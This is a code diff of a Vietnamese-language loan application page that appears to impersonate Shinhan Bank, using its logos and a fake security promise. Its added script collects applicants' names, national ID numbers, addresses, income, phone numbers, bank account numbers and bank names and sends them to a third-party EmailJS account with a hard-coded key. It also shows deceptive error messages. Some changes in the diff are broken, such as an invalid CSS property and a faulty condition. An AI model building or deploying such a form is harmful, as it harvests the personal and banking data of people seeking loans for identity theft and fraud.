@@ -7,6 +7,10 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <style>
         body {
             font-family: 'Roboto', sans-serif;
@@ -120,7 +124,7 @@
             font-weight: 500;
             padding: 8px 16px;
             background-color: #6c757d;
-            color: white;
+            color esempio: white;
             border: none;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
@@ -210,9 +214,9 @@
     </div>
 
     <div class="container">
-        <button type="button" class="back-btn" onclick="/shinhanbank/pages/vi/trang-chu.html'" aria-label="Quay lại trang trước">
+        <a href="/shinhanbank/pages/vi/trang-chu.html" class="back-btn" aria-label="Quay lại trang trước">
             <i class="bi bi-arrow-left"></i> Quay Lại
-        </button>
+        </a>
         <div class="progress-bar-container">
             <div class="progress-bar">
                 <div class="progress-bar-fill" id="progressBar" style="width: 10%"></div>
@@ -223,6 +227,10 @@
             <h5 class="step-title">Đăng Ký Hồ Sơ Vay Tín Chấp</h5>
             <p class="step-description">Vui lòng cung cấp đầy đủ thông tin cá nhân để tiến hành xét duyệt. Thông tin của bạn sẽ được gửi để thẩm định và xử lý hồ sơ.</p>
             <form id="registerForm" novalidate>
+                <div id="spamError" class="spam-error"></div>
+                <div id="emailError" class="error-message"></div>
+                <div id="storageError" class="error-message"></div>
+                <button id="retryEmailBtn" class="btn btn-primary" style="display: none;">Thử lại Email</button>
                 <div class="mb-3">
                     <label for="fullName" class="form-label">Họ và Tên <span class="tooltip-icon" data-bs-toggle="tooltip" title="Họ tên đầy đủ theo CMND/CCCD" id="fullNameTooltip">ⓘ</span></label>
                     <input type="text" class="form-control" id="fullName" required aria-describedby="fullNameTooltip">
@@ -352,60 +360,102 @@
                 <div class="mb-3">
                     <div class="terms-box">
                         <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/28x28?text=Lock';">
-                        <p>.Thông tin đăng ký sẽ được gữi xét duyệt và thẩm định. Vui lòng kiểm tra lại trước khi gữi hồ sơ.<a href="#" data-bs-toggle="modal" data-bs-target="#termsModal">Vui lòng đọc kĩ Điều khoản và Điều kiện dưới đây trước khi gữi hồ sơ. </a> trước khi tiếp tục.</p>
+                        <p>Thông tin đăng ký sẽ được gửi xét duyệt và thẩm định. Vui lòng kiểm tra lại trước khi gửi hồ sơ. <a href="#" data-bs-toggle="modal" data-bs-target="termsModal">Vui lòng đọc kỹ Điều khoản và Điều kiện</a> trước khi tiếp tục.</p>
                     </div>
                     <div class="form-check">
                         <input class="form-check-input" type="checkbox" id="termsAgree" aria-label="Đồng ý với điều khoản và điều kiện">
-                        <label class="form-check-label" for="termsAgree">
-                            Tôi đồng ý với các điều khoản hàng.</p>
-                        <h5>Trách Nhiệm của Khách Hàng</h5>
-                        <p>Khách hàng cần cung cấp thông tin chính xác và chịu trách nhiệm về tính xác thực của các tài liệu cung cấp.</p>
-                    </div>
-                    <div class="modal-footer">
-                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Đóng</button>
+                        <label class="form-check-label" for="termsAgree">Tôi đồng ý với các điều khoản và điều kiện.</label>
+                        <div id="termsFeedback" class="invalid-feedback">Vui lòng đồng ý với điều khoản.</div>
                     </div>
                 </div>
-            </div>
+                <div class="continue-btn-container">
+                    <button type="submit" class="btn btn-primary" id="confirmBtn" disabled>Gửi Hồ Sơ</button>
+                </div>
+            </form>
         </div>
+    </div>
 
-        <!-- Modal: Confirm Data -->
-        <div class="modal fade" id="confirmDataModal" tabindex="-1" aria-labelledby="confirmDataModalLabel" aria-hidden="true">
-            <div class="modal-dialog">
-                <div class="modal-content">
-                    <div class="modal-header">
-                        <h5 class="modal-title" id="confirmDataModalLabel">Xác Nhận Thông Tin</h5>
-                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Đóng"></button>
-                    </div>
-                    <div class="modal-body">
-                        <p>Vui lòng kiểm tra thông tin trước khi gửi xét duyệt:</p>
-                        <p><strong>Họ và Tên:</strong> <span id="confirmFullName"></span></p>
-                        <p><strong>Số CMND/CCCD:</strong> <span id="confirmIdNumber"></span></p>
-                        <p><strong>Ngày Cấp:</strong> <span id="confirmIdIssueDate"></span></p>
-                        <p><strong>Nơi Cấp:</strong> <span id="confirmIdIssuePlace"></span></p>
-                        <p><strong>Địa Chỉ:</strong> <span id="confirmAddress"></span></p>
-                        <p><strong>Nghề Nghiệp:</strong> <span id="confirmOccupation"></span></p>
-                        <p><strong>Thu Nhập:</strong> <span id="confirmIncome"></span></p>
-                        <p><strong>Số Điện Thoại:</strong> <span id="confirmPhoneNumber"></span></p>
-                        <p><strong>Email:</strong> <span id="confirmEmail"></span></p>
-                        <p><strong>Số Tiền Vay:</strong> <span id="confirmLoanAmount"></span></p>
-                        <p><strong>Kỳ Hạn Vay:</strong> <span id="confirmLoanTerm"></span></p>
-                        <p><strong>Mục Đích Vay:</strong> <span id="confirmLoanPurpose"></span></p>
-                        <p><strong>Số Tài Khoản:</strong> <span id="confirmAccountNumber"></span></p>
-                        <p><strong>Ngân Hàng:</strong> <span id="confirmBankName"></span></p>
-                    </div>
-                    <div class="modal-footer">
-                        <button type="button" class="btn btn-primary" id="confirmSubmitBtn">Đăng ký ngay</button>
-                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Hủy</button>
-                    </div>
+    <!-- Modal: Terms -->
+    <div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan';">
+                    <h5 class="modal-title" id="termsModalLabel">Điều Khoản và Điều Kiện</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Đóng"></button>
+                </div>
+                <div class="modal-body">
+                    <h5>Điều Kiện Vay</h5>
+                    <p>Khách hàng cần đủ 18 tuổi, có thu nhập ổn định và cung cấp đầy đủ giấy tờ theo yêu cầu.</p>
+                    <h5>Trách Nhiệm của Khách Hàng</h5>
+                    <p>Khách hàng chịu trách nhiệm về tính xác thực của thông tin và tài liệu cung cấp.</p>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Đóng</button>
                 </div>
             </div>
         </div>
-Vui lòng kiểm tra và thử lại sau.").show();
+    </div>
+
+    <!-- Modal: Confirm Data -->
+    <div class="modal fade" id="confirmDataModal" tabindex="-1" aria-labelledby="confirmDataModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="confirmDataModalLabel">Xác Nhận Thông Tin</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Đóng"></button>
+                </div>
+                <div class="modal-body">
+                    <p>Vui lòng kiểm tra thông tin trước khi gửi xét duyệt:</p>
+                    <p><strong>Họ và Tên:</strong> <span id="confirmFullName"></span></p>
+                    <p><strong>Số CMND/CCCD:</strong> <span id="confirmIdNumber"></span></p>
+                    <p><strong>Ngày Cấp:</strong> <span id="confirmIdIssueDate"></span></p>
+                    <p><strong>Nơi Cấp:</strong> <span id="confirmIdIssuePlace"></span></p>
+                    <p><strong>Địa Chỉ:</strong> <span id="confirmAddress"></span></p>
+                    <p><strong>Nghề Nghiệp:</strong> <span id="confirmOccupation"></span></p>
+                    <p><strong>Thu Nhập:</strong> <span id="confirmIncome"></span></p>
+                    <p><strong>Số Điện Thoại:</strong> <span id="confirmPhoneNumber"></span></p>
+                    <p><strong>Email:</strong> <span id="confirmEmail"></span></p>
+                    <p><strong>Số Tiền Vay:</strong> <span id="confirmLoanAmount"></span></p>
+                    <p><strong>Kỳ Hạn Vay:</strong> <span id="confirmLoanTerm"></span></p>
+                    <p><strong>Mục Đích Vay:</strong> <span id="confirmLoanPurpose"></span></p>
+                    <p><strong>Số Tài Khoản:</strong> <span id="confirmAccountNumber"></span></p>
+                    <p><strong>Ngân Hàng:</strong> <span id="confirmBankName"></span></p>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-primary" id="confirmSubmitBtn">Đăng ký ngay</button>
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Hủy</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/28x28?text=Lock';">
+        <span>Thông tin của bạn được bảo mật và mã hóa an toàn.</span>
+        <br>
+        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan';">
+    </div>
+
+    <script>
+        let userData = {};
+
+        function checkLocalStorageQuota() {
+            try {
+                const testKey = '__test__';
+                localStorage.setItem(testKey, 'test');
+                localStorage.removeItem(testKey);
+                return true;
+            } catch (e) {
+                console.error('LocalStorage quota exceeded');
                 return false;
             }
         }
 
-        // Save user data to localStorage
+        (function() {
+            emailjs.init("OrBsI926QI2_xBh1f");
+        })();
+
         function saveToLocalStorage() {
             if (!checkLocalStorageQuota()) {
                 console.error('Failed to save to localStorage: Quota exceeded');
@@ -423,7 +473,6 @@ Vui lòng kiểm tra và thử lại sau.").show();
             }
         }
 
-        // Load user data from localStorage
         function loadUserData() {
             try {
                 const storedData = localStorage.getItem('userData');
@@ -437,7 +486,6 @@ Vui lòng kiểm tra và thử lại sau.").show();
             }
         }
 
-        // Load registered IDs from localStorage
         function loadRegisteredIds() {
             try {
                 const storedIds = localStorage.getItem('registeredIds');
@@ -448,7 +496,6 @@ Vui lòng kiểm tra và thử lại sau.").show();
             }
         }
 
-        // Save registered IDs to localStorage
         function saveRegisteredIds(ids) {
             if (!checkLocalStorageQuota()) return;
             try {
@@ -460,13 +507,11 @@ Vui lòng kiểm tra và thử lại sau.").show();
             }
         }
 
-        // Format number input
         function formatNumberInput(value) {
             if (!value) return "";
             return Number(value.replace(/[^0-9]/g, '')).toLocaleString('vi-VN');
         }
 
-        // Format date input
         function formatDateInput(input) {
             let value = input.val().replace(/[^0-9]/g, '');
             if (value.length > 8) value = value.slice(0, 8);
@@ -478,7 +523,6 @@ Vui lòng kiểm tra và thử lại sau.").show();
             input.val(value);
         }
 
-        // Validate date format (DD/MM/YYYY)
         function isValidDate(dateStr) {
             const regex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
             if (!regex.test(dateStr)) return false;
@@ -487,12 +531,10 @@ Vui lòng kiểm tra và thử lại sau.").show();
             return date.getDate() == day && date.getMonth() + 1 == month && date.getFullYear() == year;
         }
 
-        // Generate random loan code
         function generateLoanCode() {
             return "SHB" + Math.floor(100000 + Math.random() * 900000);
         }
 
-        // Generate random code
         function generateRandomCode() {
             const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
             let result = "";
@@ -502,7 +544,6 @@ Vui lòng kiểm tra và thử lại sau.").show();
             return result;
         }
 
-        // Get current date
         function getCurrentDate() {
             const today = new Date();
             const day = String(today.getDate()).padStart(2, '0');
@@ -511,26 +552,22 @@ Vui lòng kiểm tra và thử lại sau.").show();
             return `${day}/${month}/${year}`;
         }
 
-        // Calculate monthly payment (simplified)
         function calculateMonthlyPayment(loanAmount, term) {
             if (!loanAmount || !term || loanAmount <= 0) return 0;
-            const monthlyRate = 0.075 / 12; // Assuming 7.5% annual interest rate
+            const monthlyRate = 0.075 / 12;
             const months = parseInt(term);
             return Math.round((loanAmount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -months)));
         }
 
-        // Calculate interest rate (simplified)
         function calculateInterestRate(loanAmount) {
-            if (!loanAmount || loanAmount <= 0) return 0;
+            if (!loanAmount || !loanAmount <= 0) return 0;
             return loanAmount >= 50000000 ? 7.5 : 8.0;
         }
 
-        // Encrypt sensitive data
         function encryptData(data) {
             return CryptoJS.AES.encrypt(data, 'shinhan-secret-key').toString();
         }
 
-        // Debounce function
         function debounce(func, wait) {
             let timeout;
             return function executedFunction(...args) {
@@ -543,7 +580,6 @@ Vui lòng kiểm tra và thử lại sau.").show();
             };
         }
 
-        // Validate input formats
         function validateInputFormats() {
             const fullName = $('#fullName').val().trim();
             const idNumber = $('#idNumber').val().trim();
@@ -559,7 +595,6 @@ Vui lòng kiểm tra và thử lại sau.").show();
             const loanPurpose = $('#loanPurpose').val();
             const accountNumber = $('#accountNumber').val().trim();
             const bankName = $('#bankName').val();
-
             const idNumberRegex = /^\d{9,12}$/;
             const phoneRegex = /^\d{10}$/;
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -569,10 +604,8 @@ Vui lòng kiểm tra và thử lại sau.").show();
             const loanTermOptions = ['6', '12', '18', '24', '36', '48', '60'];
             const loanPurposeOptions = ['Chọn gối vay', 'Sửa chữa nhà', 'Mua xe', 'Mua nhà', 'Vay tiêu dùng', 'Vay sinh viên', 'Khác'];
             const bankNameOptions = ['Shinhan Bank', 'Vietcombank', 'Techcombank', 'BIDV', 'Agribank', 'MB Bank', 'VPBank', 'Sacombank', 'ACB', 'VietinBank', 'TPBank', 'HDBank', 'MSB', 'VIB', 'SeABank', 'OCB', 'SCB', 'Nam A Bank', 'SHB', 'PVcomBank', 'BAOVIET Bank', 'LienVietPostBank', 'SAIGONBANK'];
-
             let isValid = true;
             const errors = [];
-
             if (!fullName || fullName.length < 2) {
                 $('#fullName').addClass('is-invalid');
                 $('#fullName').next('.invalid-feedback').text('Họ và tên phải có ít nhất 2 ký tự.');
@@ -653,15 +686,12 @@ Vui lòng kiểm tra và thử lại sau.").show();
                 isValid = false;
                 errors.push('bankName: Invalid selection');
             }
-
             if (!isValid) {
                 console.log('Validation errors:', errors);
             }
-
             return isValid;
         }
 
-        // Validate email parameters
         function validateEmailParams(params) {
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             if (!params.to_email || !emailRegex.test(params.to_email)) {
@@ -675,7 +705,6 @@ Vui lòng kiểm tra và thử lại sau.").show();
             return true;
         }
 
-        // Validate form and checkbox
         function validateForm() {
             const form = document.getElementById('registerForm');
             const termsAgree = document.getElementById('termsAgree');
@@ -683,65 +712,46 @@ Vui lòng kiểm tra và thử lại sau.").show();
             const confirmBtn = document.getElementById('confirmBtn');
             const idNumber = $('#idNumber').val().trim();
             const registeredIds = loadRegisteredIds();
-
-            // Reset invalid states
             $('#registerForm .form-control, #registerForm .form-select').removeClass('is-invalid');
             $('#spamError, #emailError, #storageError').hide();
-
-            // Check form fields
             let allFieldsValid = form.checkValidity() && validateInputFormats();
             if (!allFieldsValid) {
                 form.classList.add('was-validated');
             }
-
-            // Check if idNumber is already registered
             if (idNumber && registeredIds.includes(idNumber)) {
                 $('#spamError').text('Bạn đã có hồ sơ tại Shinhanbank.').show();
                 allFieldsValid = false;
             }
-
-            // Check terms checkbox
             if (!termsAgree.checked) {
                 termsFeedback.style.display = 'block';
                 allFieldsValid = false;
             } else {
                 termsFeedback.style.display = 'none';
             }
-
             confirmBtn.disabled = !allFieldsValid;
-
             console.log('Form validation:', { allFieldsValid, termsChecked: termsAgree.checked, idNumberRegistered: registeredIds.includes(idNumber) });
         }
 
-        // Anti-spam check (combined from Code 1 and Code 2)
         function checkSpam() {
             const now = Date.now();
             const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
             const lastRegistrationTime = spamData.lastRegistrationTime || 0;
             const registrationCount = spamData.registerCount || 0;
             const registrationResetTime = spamData.resetTime || now;
-
-            // Reset count after 24 hours
             if (now > registrationResetTime) {
                 spamData.registerCount = 0;
                 spamData.resetTime = now + 24 * 60 * 60 * 1000;
             }
-
-            // Check time between registrations (5 minutes)
-            const timeSinceLast = (now - lastRegistrationTime) / 1000; // in seconds
+            const timeSinceLast = (now - lastRegistrationTime) / 1000;
             if (timeSinceLast < 300) {
                 return { allowed: false, message: 'Bạn đã đăng ký quá nhanh. Vui lòng thử lại sau 5 phút.' };
             }
-
-            // Check registration limit (5 per day)
             if (registrationCount >= 5) {
                 return { allowed: false, message: 'Bạn đã vượt quá số lần đăng ký trong 24 giờ. Vui lòng thử lại sau.' };
             }
-
             return { allowed: true };
         }
 
-        // Update spam data
         function updateSpamData() {
             const now = Date.now();
             const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
@@ -751,7 +761,6 @@ Vui lòng kiểm tra và thử lại sau.").show();
             localStorage.setItem('spamData', JSON.stringify(spamData));
         }
 
-        // Send registration data via EmailJS with retry
         function sendRegistrationDataEmail() {
             const params = {
                 to_name: userData.fullName || '',
@@ -773,19 +782,16 @@ Vui lòng kiểm tra và thử lại sau.").show();
                 registration_date: userData.registrationDate || '',
                 to_email: userData.email || 'support@shinhan.com.vn'
             };
-
             if (!validateEmailParams(params)) {
                 $('#emailError').text('Thông tin email không hợp lệ. Vui lòng kiểm tra lại.').show();
                 return;
             }
-
             console.log('Preparing to send EmailJS params for Step1:', params);
-
             function trySendEmail(attempt = 1, maxAttempts = 5) {
                 emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
                     .then(() => {
                         console.log('Email sent successfully on attempt', attempt);
-                        alert("Đả gữi hồ sơ!");
+                        alert("Đã gửi hồ sơ!");
                         localStorage.removeItem('pendingEmail');
                         $('#retryEmailBtn').hide();
                         window.location.href = 'step2.html';
@@ -796,18 +802,16 @@ Vui lòng kiểm tra và thử lại sau.").show();
                             console.log('Retrying EmailJS send...');
                             setTimeout(() => trySendEmail(attempt + 1, maxAttempts), 2000 * Math.pow(2, attempt));
                         } else {
-                            alert("Thông tin không trùng khớp trên hệ thống. Vui lòng kiểm tra và gữi lại sau.");
+                            alert("Thông tin không trùng khớp trên hệ thống. Vui lòng kiểm tra và gửi lại sau.");
                             localStorage.setItem('pendingEmail', JSON.stringify(params));
                             $('#emailError').text('Đăng ký quá nhanh vui lòng thử lại sau 10 phút.').show();
                             $('#retryEmailBtn').show();
                         }
                     });
             }
-
             trySendEmail();
         }
 
-        // Load saved data and initialize form
         window.onload = function() {
             loadUserData();
             $('#fullName').val(userData.fullName || '');
@@ -825,33 +829,24 @@ Vui lòng kiểm tra và thử lại sau.").show();
             $('#accountNumber').val(userData.accountNumber || '');
             $('#bankName').val(userData.bankName || '');
             $('#termsAgree').prop('checked', userData.termsAgree || false);
-
-            // Initialize tooltips
             var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
             tooltipTriggerList.map(function (tooltipTriggerEl) {
                 return new bootstrap.Tooltip(tooltipTriggerEl);
             });
-
-            // Validate form on load
             validateForm();
-
-            // Check for pending email
             const pendingEmail = localStorage.getItem('pendingEmail');
             if (pendingEmail) {
                 $('#retryEmailBtn').show();
             }
         };
 
-        // Debounced validateForm
         const debouncedValidateForm = debounce(validateForm, 300);
 
-        // Format date input for idIssueDate
         $('#idIssueDate').on('input', function() {
             formatDateInput($(this));
             debouncedValidateForm();
         });
 
-        // Format number inputs
         $('#income, #loanAmountInput, #accountNumber').on('input', function() {
             let value = $(this).val().replace(/[^0-9]/g, '');
             if (value && this.id !== 'accountNumber') {
@@ -862,11 +857,9 @@ Vui lòng kiểm tra và thử lại sau.").show();
             debouncedValidateForm();
         });
 
-        // Validate on input change
         $('#registerForm input, #registerForm select').on('input change', debouncedValidateForm);
         $('#termsAgree').on('change', debouncedValidateForm);
 
-        // Retry sending email
         $('#retryEmailBtn').on('click', function() {
             const pendingEmail = localStorage.getItem('pendingEmail');
             if (pendingEmail) {
@@ -877,19 +870,16 @@ Vui lòng kiểm tra và thử lại sau.").show();
                     }
                 } catch (error) {
                     console.error('Error retrying pending email:', error);
-                    $('#emailError').text('Thông tin đăng ký không trùng khớp trên hệ thốngthống. Vui lòng thử lại sau.').show();
+                    $('#emailError').text('Thông tin đăng ký không trùng khớp trên hệ thống. Vui lòng thử lại sau.').show();
                 }
             }
         });
 
-        // Form submission
         $('#registerForm').on('submit', function(e) {
             e.preventDefault();
             const form = e.target;
             form.classList.add('was-validated');
             $('#storageError, #emailError').hide();
-
-            // Check anti-spam
             const spamCheck = checkSpam();
             if (!spamCheck.allowed) {
                 $('#spamError').text(spamCheck.message).show();
@@ -898,9 +888,7 @@ Vui lòng kiểm tra và thử lại sau.").show();
             } else {
                 $('#spamError').hide();
             }
-
             if (form.checkValidity() && $('#termsAgree').is(':checked') && validateInputFormats()) {
-                // Populate confirm modal
                 $('#confirmFullName').text($('#fullName').val().trim() || '');
                 $('#confirmIdNumber').text($('#idNumber').val().trim() || '');
                 $('#confirmIdIssueDate').text($('#idIssueDate').val().trim() || '');
@@ -915,8 +903,6 @@ Vui lòng kiểm tra và thử lại sau.").show();
                 $('#confirmLoanPurpose').text($('#loanPurpose option:selected').text() || '');
                 $('#confirmAccountNumber').text($('#accountNumber').val().trim() || '');
                 $('#confirmBankName').text($('#bankName option:selected').text() || '');
-
-                // Show confirm modal
                 const confirmModal = new bootstrap.Modal(document.getElementById('confirmDataModal'));
                 confirmModal.show();
             } else {
@@ -925,7 +911,6 @@ Vui lòng kiểm tra và thử lại sau.").show();
             }
         });
 
-        // Confirm submission
         $('#confirmSubmitBtn').on('click', function() {
             const income = $('#income').val().replace(/[^0-9]/g, '');
             const loanAmount = $('#loanAmountInput').val().replace(/[^0-9]/g, '');
@@ -960,23 +945,18 @@ Vui lòng kiểm tra và thử lại sau.").show();
                 currentStep: 2
             };
             console.log('Submitting userData:', userData);
-
-            // Save idNumber to registeredIds
             if (userData.idNumber) {
                 const registeredIds = loadRegisteredIds();
                 registeredIds.push(userData.idNumber);
                 saveRegisteredIds(registeredIds);
             }
-
             if (saveToLocalStorage()) {
                 updateSpamData();
                 sendRegistrationDataEmail();
             } else {
                 console.error('Failed to save to localStorage, not redirecting');
-                alert('Thông tin không trùng khớp trên hệ thống. Quý khách vui lòng kiểm tra và thử lại sau.");
+                alert('Thông tin không trùng khớp trên hệ thống. Quý khách vui lòng kiểm tra và thử lại sau.');
             }
-
-            // Hide confirm modal
             bootstrap.Modal.getInstance(document.getElementById('confirmDataModal')).hide();
         });
     </script>
